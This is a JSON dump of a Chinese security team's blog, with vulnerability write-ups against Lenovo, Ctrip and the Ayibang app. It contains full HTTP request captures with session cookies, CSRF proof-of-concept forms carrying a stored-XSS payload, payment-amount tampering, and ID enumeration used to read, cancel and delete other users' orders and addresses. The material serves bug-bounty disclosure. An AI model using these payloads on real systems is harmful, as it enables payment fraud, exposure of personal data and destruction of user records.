{"meta":{"title":"Cai_Team","subtitle":"十年寒窗如一日，一举成名天下知","description":"一支有梦想的技术团队","author":null,"url":"127.0.0.1"},"pages":[{"title":"","date":"2018-05-28T15:51:03.450Z","updated":"2018-05-22T19:42:22.000Z","comments":true,"path":"404.html","permalink":"127.0.0.1/404.html","excerpt":"","text":"404 *{margin:0;padding:0;outline:none;font-family:\\5FAE\\8F6F\\96C5\\9ED1,宋体;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;-khtml-user-select:none;user-select:none;cursor:default;font-weight:lighter;} .center{margin:0 auto;} .whole{width:100%;height:100%;line-height:100%;position:fixed;bottom:0;left:0;z-index:-1000;overflow:hidden;} .whole img{width:100%;height:100%;} .mask{width:100%;height:100%;position:absolute;top:0;left:0;background:#000;opacity:0.6;filter:alpha(opacity=60);} .b{width:100%;text-align:center;height:400px;position:absolute;top:50%;margin-top:-230px}.a{width:150px;height:50px;margin-top:30px}.a a{display:block;float:left;width:150px;height:50px;background:#fff;text-align:center;line-height:50px;font-size:18px;border-radius:25px;color:#333}.a a:hover{color:#000;box-shadow:#fff 0 0 20px} p{color:#fff;margin-top:40px;font-size:24px;} #num{margin:0 5px;font-weight:bold;} var num=4; function redirect(){ num--; document.getElementById(\"num\").innerHTML=num; if(num"},{"title":"Cai_Team团队介绍","date":"2018-05-23T13:24:44.000Z","updated":"2018-06-15T15:28:13.407Z","comments":true,"path":"about/index.html","permalink":"127.0.0.1/about/index.html","excerpt":"","text":"我们团队创建的初衷是一起学习，一起成长，以及在未来的日子里以战队的名义去参加那些大大小小的CTF比赛 所在正在属于学习阶段，也是刚刚起步阶段，所以在未来的日子里，我会把成长中遇到的困难已经自己的心得写成文章发布到此博客，并且完全免费( 除非一些内部文章，虽然免费，但会有密码的，一般情况下是不会泄露的 = v = )，希望你们的付出以及我们的付出都能得到相应的回报~ 目前团队成员五员: Iamfree mumuo 回火 Xsir 一条快乐的咸鱼 逗逗 如果您觉得自己能够一起学习的，有共同的目标，你也可以联系我们，期待你的到来，我们一起成长，共同进步，we need you! 排名不分前后 后续博客大概会推出以下区域文章： 代码审计 计算机组成原理 Web攻防 Pwn 逆向破解 CTF比赛解题 前端开发 PHP Python 渗透工具编写 等( 以上纯属吹牛逼，哈哈哈哈 ) 让我们携手做一件有意义的事情，一件让我们回忆就值得骄傲，一件正真唱响青春无悔的事情！ 十年寒窗无人问，一举成名天下知 – Cai_Team"},{"title":"标签","date":"2018-05-23T08:23:08.000Z","updated":"2018-05-23T08:26:40.000Z","comments":true,"path":"tags/index.html","permalink":"127.0.0.1/tags/index.html","excerpt":"","text":""},{"title":"分类","date":"2018-05-23T08:26:06.000Z","updated":"2018-05-23T08:26:32.000Z","comments":true,"path":"categories/index.html","permalink":"127.0.0.1/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"漏洞挖掘经验|联想商城某处存在ID越权授权","slug":"联想商城某处存在ID越权授权","date":"2018-06-22T08:29:07.000Z","updated":"2018-06-22T08:36:08.747Z","comments":true,"path":"2018/06/22/联想商城某处存在ID越权授权/","link":"","permalink":"127.0.0.1/2018/06/22/联想商城某处存在ID越权授权/","excerpt":"内部文章，禁止转载！","text":"内部文章，禁止转载！ 漏洞URL：https://account.lenovo.com/us/zh/requestaccess 我们需要注册一个账号，然后进入上述漏洞网址,如图 我们在这里我们随便输入BID，然后用burp抓包。 抓取返回包。 把参数Statecode=-1改为statecode=1 Forward放包 这样的话无论我们输入BID为何值都没有用了，因为已经显示 ID is already authorized ，意思为该ID已经被授权。 这个漏洞最主要的就是授权的时候只判断了 ID 的返回结果，所以导致了 越权漏洞 的参数 这里吐槽一下，联想审核的第一次拒绝了我，然后我申诉，给我过了，我以为是个高危，没想到审核说越权行为已经确认产生，但是越权产生的危害不能确认，因此判定为越权行为为中风险，有点扎心 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"内部资料","slug":"内部资料","permalink":"127.0.0.1/categories/内部资料/"},{"name":"Web攻防","slug":"内部资料/Web攻防","permalink":"127.0.0.1/categories/内部资料/Web攻防/"},{"name":"作者：一条快乐的咸鱼","slug":"内部资料/Web攻防/作者：一条快乐的咸鱼","permalink":"127.0.0.1/categories/内部资料/Web攻防/作者：一条快乐的咸鱼/"}],"tags":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"127.0.0.1/tags/漏洞挖掘/"},{"name":"越权漏洞","slug":"越权漏洞","permalink":"127.0.0.1/tags/越权漏洞/"},{"name":"实战渗透","slug":"实战渗透","permalink":"127.0.0.1/tags/实战渗透/"}]},{"title":"携程发游记处存在Csrf+存储Xss漏洞","slug":"携程发游记处存在Csrf-存储Xss漏洞","date":"2018-06-21T12:48:33.000Z","updated":"2018-06-21T16:15:07.711Z","comments":true,"path":"2018/06/21/携程发游记处存在Csrf-存储Xss漏洞/","link":"","permalink":"127.0.0.1/2018/06/21/携程发游记处存在Csrf-存储Xss漏洞/","excerpt":"声明：内部文章,禁止转载! 继上篇 携程某处存在Json格式的Csrf漏洞发游记 写完后，又挖到一个 Xss (某大佬提醒的),然后造成了组合拳~","text":"声明：内部文章,禁止转载! 继上篇 携程某处存在Json格式的Csrf漏洞发游记 写完后，又挖到一个 Xss (某大佬提醒的),然后造成了组合拳~ URL -&gt; http://you.ctrip.com/members/47A3D55C158041BD8D7F21A7BA084AA1/journals 打开URL后，页面如图 点击上图的写游记点击后会进入另一个页面，如下图 点击发布又又又还有一个页面 选好后点击提交并且抓包 抓取的数据包如下：123456789101112131415POST /TravelSite/Member/SaveNewTravel HTTP/1.1Host: you.ctrip.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://you.ctrip.com/TravelSite/Member/EditNewTravel?travelId=3689502Content-Length: 508Cookie: _bfa=1.1529559162771.3aowri.1.1529564159709.1529575803710.3.139; adscityen=Meizhou; _RF1=120.239.228.99; _RSG=T6KJObxFMeEUqcn7NtwLW8; _RDG=2885568a6cac882bb818690bc2de21a339; _RGUID=ea163fb9-584d-419d-8815-eb75c7c66d1e; _jzqco=%7C%7C%7C%7C1529559191059%7C1.113394883.1529559190871.1529579192824.1529579227556.1529579192824.1529579227556.undefined.0.0.31.31; __zpspc=9.3.1529576375.1529579227.12%234%7C%7C%7C%7C%7C%23; MKT_Pagesource=PC; _bfi=p1%3D290606%26p2%3D290606%26v1%3D139%26v2%3D137; login_uid=92A18FCF669DF32698BF54DD2CE7E1D1; login_type=0; UUID=1508E76B015E4E609698BCA0B9CA2320; IsPersonalizedLogin=T; appFloatCnt=1; manualclose=1; ASP.NET_SessionSvc=MTAuOC4xODkuNjB8OTA5MHxqaW5xaWFvfGRlZmF1bHR8MTUyNjUzNzExNDI2Mw; bdshare_firstime=1529559824392; _abtest_userid=a62eb7c0-4054-48fa-8421-eaae213957d6; ASP.NET_SessionId=tcktpejhlxfokmlnf1q1zn3j; _bfs=1.41; cticket=1C81168DBA3550FFB18DE9387721086ADC29F177C61F3FCDDEC332A0F561FEA1; ticket_ctrip=bJ9RlCHVwlu1ZjyusRi+ypZ7X2r4+yojO82DkiXyGYeP0Mg96gJEQ+LWMo18plOrPdkAeXYih6tqb1Y94QwsvBuemHYmTAK0dmQ8i4jhcqKgOgeTp2vPOL0poU5JHB7aZMn8dLj1VWnc06YYBrgW94hk8E69pgP+7xG9aEMLIjSajqQw9nQHaiqeULn6n6AWdH6Nx5wwmPYV+vaMlu4TmQRy40no+qH6nW0v79DvqWom85pWMuKY4cNlH+KZ0DFagL1nXMWbTg4m8Yq5UtJ0aAvGpE4MsXq6PXfRNy1Vkmc=; AHeadUserInfo=VipGrade=0&amp;UserName=&amp;NoReadMessageCount=0; DUID=u=08F36DBB6DC5886589DDBB5100AD9461&amp;v=0; IsNonUser=FConnection: close&#123;&quot;Content&quot;:&quot;&lt;p&gt;1111111111&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br/&gt;&lt;/p&gt;&quot;,&quot;Title&quot;:&quot;11111&quot;,&quot;UploadPicContent&quot;:&quot;&quot;,&quot;CoverImageId&quot;:0,&quot;TravelId&quot;:&quot;3689502&quot;,&quot;CoverLocationY&quot;:0,&quot;ClassifiedInfo&quot;:&#123;&quot;DistrictList&quot;:[&#123;&quot;DistrictId&quot;:&quot;110000&quot;,&quot;DistrictName&quot;:&quot;ä¸­å½ï¼äºæ´²&quot;,&quot;IsSelected&quot;:true&#125;,&#123;&quot;DistrictId&quot;:&quot;1&quot;,&quot;DistrictName&quot;:&quot;111111&gt;&quot;,&quot;IsSelected&quot;:true&#125;],&quot;TagList&quot;:[],&quot;TravelId&quot;:&quot;3689502&quot;,&quot;ClassifiedType&quot;:6,&quot;TravelDays&quot;:1111111111,&quot;DepartureDate&quot;:&quot;2018-06-13&quot;,&quot;Consume&quot;:111,&quot;CompanionType&quot;:1&#125;,&quot;PublishStatus&quot;:1&#125; 可以看到这里是由 Json 传递的，并且没有 Token 之类的验证，那么就可能会存在 Csrf 我们将其构造成 Csrf Poc,这里还存在存储Xss，打包在如下POC:123456789&lt;html&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/');&lt;/script&gt; &lt;form action=\"http://you.ctrip.com/TravelSite/Member/SaveNewTravel\" method=\"POST\" enctype=\"text/plain\"&gt; &lt;input name='&#123;\"Content\":\"&lt;h1&gt;test&lt;/h1&gt;&lt;img src=x onerror=alert(\\\"cookie\\\")&gt;\",\"UploadPicContent\":\"\",\"CoverImageId\":0,\"TravelId\":\"3689502\",\"CoverLocationY\":0,\"ClassifiedInfo\":&#123;\"DistrictList\":[&#123;\"DistrictId\":\"110000\",\"DistrictName\":\"涓浗锛屼簹娲�\",\"IsSelected\":true&#125;,&#123;\"DistrictId\":\"1\",\"DistrictName\":\"111111&gt;\",\"IsSelected\":true&#125;],\"TagList\":[],\"TravelId\":\"3689502\",\"ClassifiedType\":6,\"TravelDays\":1111111111,\"DepartureDate\":\"2018-06-13\",\"Consume\":111,\"CompanionType\":10&#125;,\"PublishStatus\":1,\"Title\":\"love you' value='love rice\"&#125;' type='hidden'&gt; &lt;input type=\"submit\" value=\"Submit request\" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 在浏览器打开此Poc 查看一下是否真的发布成功~ 接着我们点击编辑，查看是否会触发Xss ok~ 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"Web攻防","slug":"Web攻防","permalink":"127.0.0.1/categories/Web攻防/"},{"name":"渗透测试","slug":"Web攻防/渗透测试","permalink":"127.0.0.1/categories/Web攻防/渗透测试/"},{"name":"作者：Iamfree","slug":"Web攻防/渗透测试/作者：Iamfree","permalink":"127.0.0.1/categories/Web攻防/渗透测试/作者：Iamfree/"}],"tags":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"127.0.0.1/tags/漏洞挖掘/"},{"name":"Json Csrf","slug":"Json-Csrf","permalink":"127.0.0.1/tags/Json-Csrf/"},{"name":"存储Xss","slug":"存储Xss","permalink":"127.0.0.1/tags/存储Xss/"},{"name":"Web漏洞组合拳","slug":"Web漏洞组合拳","permalink":"127.0.0.1/tags/Web漏洞组合拳/"}]},{"title":"携程某处存在Json格式的Csrf漏洞发游记","slug":"携程某处存在Csrf漏洞发游记","date":"2018-06-21T11:13:28.000Z","updated":"2018-06-21T16:29:25.077Z","comments":true,"path":"2018/06/21/携程某处存在Csrf漏洞发游记/","link":"","permalink":"127.0.0.1/2018/06/21/携程某处存在Csrf漏洞发游记/","excerpt":"内部文章，禁止转载","text":"内部文章，禁止转载 URL -&gt; http://you.ctrip.com/members/47A3D55C158041BD8D7F21A7BA084AA1/journals 1. 打开URL后，页面如图 2. 点击上图的写游记点击后会进入另一个页面，如下图 3. 点击发布又又又还有一个页面 4. 选好后点击提交并且抓包 抓取的数据包如下：123456789101112131415POST /TravelSite/Member/SaveNewTravel HTTP/1.1Host: you.ctrip.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://you.ctrip.com/TravelSite/Member/EditNewTravel?travelId=3689394Content-Length: 519Cookie: _bfa=1.1529559162771.3aowri.1.1529564159709.1529575803710.3.105; adscityen=Meizhou; _RF1=120.239.228.99; _RSG=T6KJObxFMeEUqcn7NtwLW8; _RDG=2885568a6cac882bb818690bc2de21a339; _RGUID=ea163fb9-584d-419d-8815-eb75c7c66d1e; _jzqco=%7C%7C%7C%7C1529559191059%7C1.113394883.1529559190871.1529565815866.1529576375632.1529565815866.1529576375632.undefined.0.0.20.20; __zpspc=9.3.1529576375.1529576375.1%234%7C%7C%7C%7C%7C%23; MKT_Pagesource=PC; _bfi=p1%3D290606%26p2%3D290606%26v1%3D105%26v2%3D104; login_uid=92A18FCF669DF32698BF54DD2CE7E1D1; login_type=0; UUID=1508E76B015E4E609698BCA0B9CA2320; IsPersonalizedLogin=F; appFloatCnt=1; manualclose=1; ASP.NET_SessionSvc=MTAuOC4xODkuNjB8OTA5MHxqaW5xaWFvfGRlZmF1bHR8MTUyNjUzNzExNDI2Mw; bdshare_firstime=1529559824392; _abtest_userid=a62eb7c0-4054-48fa-8421-eaae213957d6; cticket=1C81168DBA3550FFB18DE9387721086AA1AB2E3206164EF5DE4BF207D9F2AE8E; ticket_ctrip=bJ9RlCHVwlu1ZjyusRi+ypZ7X2r4+yojO82DkiXyGYeP0Mg96gJEQ+LWMo18plOrPdkAeXYih6tqb1Y94QwsvBuemHYmTAK0dmQ8i4jhcqKYiDhbXtS6b1594tYlhp4+VrZJoGlAq59Sa38eZFCT3+EpL6sqTuRUM54pmZHcxmxbT82oGUQF+6luF9/OQHCxD8ehHHp4AyfgBbwPE8WZTr6KEJYMAnGc5VDEoyGx91d2l+3B3eOk3Y2gGeR7BJbvn2PtKP3/2CZEUX0mKtoYQ5utvxMGO5R+fKJN1MMgSTw=; AHeadUserInfo=VipGrade=0&amp;UserName=&amp;NoReadMessageCount=0; DUID=u=08F36DBB6DC5886589DDBB5100AD9461&amp;v=0; IsNonUser=F; ASP.NET_SessionId=tcktpejhlxfokmlnf1q1zn3j; _bfs=1.7Connection: close&#123;&quot;Content&quot;:&quot;&lt;p&gt;1111111111&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br/&gt;&lt;/p&gt;&quot;,&quot;Title&quot;:&quot;11111&quot;,&quot;UploadPicContent&quot;:&quot;&quot;,&quot;CoverImageId&quot;:0,&quot;TravelId&quot;:&quot;3689394&quot;,&quot;CoverLocationY&quot;:0,&quot;ClassifiedInfo&quot;:&#123;&quot;DistrictList&quot;:[&#123;&quot;DistrictId&quot;:&quot;110000&quot;,&quot;DistrictName&quot;:&quot;ä¸­å½ï¼äºæ´²&quot;,&quot;IsSelected&quot;:true&#125;,&#123;&quot;DistrictId&quot;:&quot;1&quot;,&quot;DistrictName&quot;:&quot;åäº¬ï¼ä¸­å½&quot;,&quot;IsSelected&quot;:true&#125;],&quot;TagList&quot;:[],&quot;TravelId&quot;:&quot;3689394&quot;,&quot;ClassifiedType&quot;:6,&quot;TravelDays&quot;:1111111111111,&quot;DepartureDate&quot;:&quot;2018-06-13&quot;,&quot;Consume&quot;:111,&quot;CompanionType&quot;:1&#125;,&quot;PublishStatus&quot;:1&#125; 可以看到这里是由 Json 传递的，并且没有 Token 之类的验证，那么就可能会存在 Csrf 5. 我们将其构造成 Csrf Poc123456789&lt;html&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/');&lt;/script&gt; &lt;form action=\"http://you.ctrip.com/TravelSite/Member/SaveNewTravel\" method=\"POST\" enctype=\"text/plain\"&gt; &lt;input name='&#123;\"Content\":\"&lt;p&gt;1111111111&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br/&gt;&lt;/p&gt;\",\"Title\":\"11111\",\"UploadPicContent\":\"\",\"CoverImageId\":0,\"TravelId\":\"3689394\",\"CoverLocationY\":0,\"ClassifiedInfo\":&#123;\"DistrictList\":[&#123;\"DistrictId\":\"110000\",\"DistrictName\":\"涓浗锛屼簹娲�\",\"IsSelected\":true&#125;,&#123;\"DistrictId\":\"1\",\"DistrictName\":\"鍖椾含锛屼腑鍥�\",\"IsSelected\":true&#125;],\"TagList\":[],\"TravelId\":\"3689394\",\"ClassifiedType\":6,\"TravelDays\":1111111111111,\"DepartureDate\":\"2018-06-13\",\"Consume\":111,\"CompanionType\":1&#125;,\"PublishStatus\":1' value='\"&#125;' type='hidden'&gt; &lt;input type=\"submit\" value=\"Submit request\" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 疑问很多人会问Csrf Poc数据包中的如下代码是干嘛的:1&quot;PublishStatus&quot;:1&apos; value=&apos;&quot;&#125;&apos; 那么下面我就来解答一下~ 首先我们打开这个构造好的Csrf Poc，并且抓包。 可以看到，这里会多出一个=号，这是为什么呢？我就不拐弯抹角了，看如下案例。 案例创建一个1.html文件，代码如下:12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;iamfree&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=\"https://www.baidu.com\" method=\"POST\"&gt; &lt;input type=\"hidden\" name=\"name\" value=\"value\"&gt; &lt;input type=\"submit\" value=\"提交\"&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 我们在浏览器打开这个html文件并且抓包~ 看到这里的 = 号了吗，也就是说但我们在设置一个 input 属性的时候,会将name的值和value的值以一个等于号的形式传递，所以说上面我们构造好的Csrf Poc就是为了将这个=号放在数据里面，否则传递的Json会报错~ 6. 浏览器处打开这个Poc 我们确认一下是否可以发布 可以看到并没有发布，这其中肯定有猫腻，我们再继续分析一波 7. 分析异常 8. 异常处理 异常分析后修改的Csrf Poc如下：123456789&lt;html&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/');&lt;/script&gt; &lt;form action=\"http://you.ctrip.com/TravelSite/Member/SaveNewTravel\" method=\"POST\" enctype=\"text/plain\"&gt; &lt;input name='&#123;\"Content\":\"&lt;p&gt;1111111111&lt;/p&gt;\",\"UploadPicContent\":\"\",\"CoverImageId\":0,\"TravelId\":\"3689394\",\"CoverLocationY\":0,\"ClassifiedInfo\":&#123;\"DistrictList\":[&#123;\"DistrictId\":\"110000\",\"DistrictName\":\"涓浗锛屼簹娲�\",\"IsSelected\":true&#125;,&#123;\"DistrictId\":\"1\",\"DistrictName\":\"鍖椾含锛屼腑鍥�\",\"IsSelected\":true&#125;],\"TagList\":[],\"TravelId\":\"3689394\",\"ClassifiedType\":6,\"TravelDays\":1111111111,\"DepartureDate\":\"2018-06-13\",\"Consume\":111,\"CompanionType\":1&#125;,\"PublishStatus\":1,\"Title\":\"1111' value='\"&#125;' type='hidden'&gt; &lt;input type=\"submit\" value=\"Submit request\" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 9. 在浏览器处打开此POC 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"Web攻防","slug":"Web攻防","permalink":"127.0.0.1/categories/Web攻防/"},{"name":"渗透测试","slug":"Web攻防/渗透测试","permalink":"127.0.0.1/categories/Web攻防/渗透测试/"},{"name":"作者：Iamfree","slug":"Web攻防/渗透测试/作者：Iamfree","permalink":"127.0.0.1/categories/Web攻防/渗透测试/作者：Iamfree/"}],"tags":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"127.0.0.1/tags/漏洞挖掘/"},{"name":"Json Csrf","slug":"Json-Csrf","permalink":"127.0.0.1/tags/Json-Csrf/"}]},{"title":"腾讯某处SSRF漏洞","slug":"腾讯某处SSRF漏洞","date":"2018-06-16T09:50:20.000Z","updated":"2018-06-16T09:50:20.904Z","comments":true,"path":"2018/06/16/腾讯某处SSRF漏洞/","link":"","permalink":"127.0.0.1/2018/06/16/腾讯某处SSRF漏洞/","excerpt":"","text":"十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[],"tags":[]},{"title":"阿姨帮最新APP漏洞大全(支付漏洞/地址/订单遍历/删除等)","slug":"阿姨帮最新APP漏洞大全","date":"2018-06-16T09:39:01.000Z","updated":"2018-06-16T09:47:52.338Z","comments":true,"path":"2018/06/16/阿姨帮最新APP漏洞大全/","link":"","permalink":"127.0.0.1/2018/06/16/阿姨帮最新APP漏洞大全/","excerpt":"危害：看文章自己脑补漏洞等级：高提交时间： 2016-02-02 12:45","text":"危害：看文章自己脑补漏洞等级：高提交时间： 2016-02-02 12:45 简要描述：阿姨帮最新版APP(v6.2.0)漏洞打包 详细说明：支付漏洞1. 超低价格支付订单点击首页，随便选择一项服务并下订单 2. 点击确认支付抓包并先截断提交：123456789101112POST https://api-cust.ayibang.com/v1/pay/wx/sign HTTP/1.1User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34Network: WiFiCity: beijingTimestamp: 1452845167007Content-Type: application/x-www-form-urlencoded; charset=UTF-8Host: api-cust.ayibang.comConnection: Keep-AliveAccept-Encoding: gzipContent-Length: 128out_trade_no=11291191&amp;attach=0_1_13800000000_0&amp;body=%E9%98%BF%E5%A7%A8%E5%B8%AE%E6%94%AF%E4%BB%98&amp;total_fee=5000&amp;trade_type=AP 将上面的total_fee的值改为1，提交 支付成功后订单成为待确认状态，说明支付成功 任意用户订单查看点击我们刚生成的订单，系统访问如下地址： 123456789GET https://api-cust.ayibang.com/v1/order/detail?orderID=11291191 HTTP/1.1User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34Network: WiFiCity: beijingTimestamp: 1452845324989Host: api-cust.ayibang.comConnection: Keep-AliveAccept-Encoding: gzip orderID=11291191处可遍历，burp出手对订单的后四位遍历 N多订单信息可看 以订单ID为11290071为例，可查看到该订单涉及用户的姓名 手机号 住址等 任意用户订单取消漏洞点击之前的订单，点击取消订单，会抓到如下请求包:123456789101112POST https://api-cust.ayibang.com/v1/order/cancel HTTP/1.1User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34Network: WiFiCity: beijingTimestamp: 1452846770206Content-Type: application/x-www-form-urlencoded; charset=UTF-8Host: api-cust.ayibang.comConnection: Keep-AliveAccept-Encoding: gzipContent-Length: 42data=%7B%22orderID%22%3A%2211291191%22%7D&amp; post处内容url解码后为：{“orderID”:”11291191”} 通过遍历orderID可删除所有订单 通过另一手机注册一个账号并下一个订单 抓包查得该订单ID为11292401 提交以下数据包： 123456789101112POST https://api-cust.ayibang.com/v1/order/cancel HTTP/1.1User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34Network: WiFiCity: beijingTimestamp: 1452846770206Content-Type: application/x-www-form-urlencoded; charset=UTF-8Host: api-cust.ayibang.comConnection: Keep-AliveAccept-Encoding: gzipContent-Length: 42data=%7B%22orderID%22%3A%2211292401%22%7D&amp; 成功取消订单 再查看该用户订单列表，已经成为空： 任意用户服务地址删除1. 点击app里面服务地址 2. 添加两个地址 然后删除上面的两个地址，并抓包 1. 删除第一个地址请求数据包如下：123456789GET https://api-cust.ayibang.com/v1/house/delete?houseID=17334752 HTTP/1.1User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557Network: WiFiCity: nanjingTimestamp: 1452841496773Host: api-cust.ayibang.comConnection: Keep-AliveAccept-Encoding: gzip 返回数据包如下：12345678HTTP/1.1 200 OKServer: nginxDate: Fri, 15 Jan 2016 07:04:57 GMTContent-Type: application/jsonConnection: closeX-Powered-By: PHP/5.6.11Content-Length: 628&#123;&quot;house&quot;:&#123;&quot;id&quot;:&quot;17334752&quot;,&quot;custID&quot;:&quot;16989352&quot;,&quot;city&quot;:&quot;nanjing&quot;,&quot;cityName&quot;:&quot;\\u5357\\u4eac&quot;,&quot;zone&quot;:&quot;null&quot;,&quot;nameAddr&quot;:&quot;\\u5b9e\\u9a8c\\ 上面内容解码后如下： 可以看到statusName处标记为已删除，并且数据包返回的ID与删除的ID为同一ID：17334752 再删除另外一个地址：123456789GET https://api-cust.ayibang.com/v1/house/delete?houseID=17336562 HTTP/1.1User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557Network: WiFiCity: nanjingTimestamp: 1452841783577Host: api-cust.ayibang.comConnection: Keep-AliveAccept-Encoding: gzip 由此可看到系统删除服务地址是根据不同的ID来实现的，虽然数字不是连续的，但是经过几次尝试发现都是以17开头的8位数字，如此遍可以通过遍历id删除其它用户的服务地址 只需提交以下数据包：123GET https://api-cust.ayibang.com/v1/house/delete?houseID=17336562 HTTP/1.1User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557 通过burpsuite 遍历houseID处，即可删除所有用户收获地址 以下为我随便找的一个用户地址（抱歉给这位用户带来困扰）：12345678910GET https://api-cust.ayibang.com/v1/house/delete?houseID=17330512 HTTP/1.1Host: api-cust.ayibang.comConnection: keep-aliveCache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36 OPR/34.0.2036.47DNT: 1Accept-Encoding: gzip, deflate, lzma, sdchAccept-Language: zh-CN,zh;q=0.8 返回： 漏洞证明如果需要通过浏览器复现上面问题，需要注意数据请求处有一个请求头：Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557此处的authorization是用户在登录APP的时候服务器返回的认证key 十年寒窗无人问，一举成名天下知 – 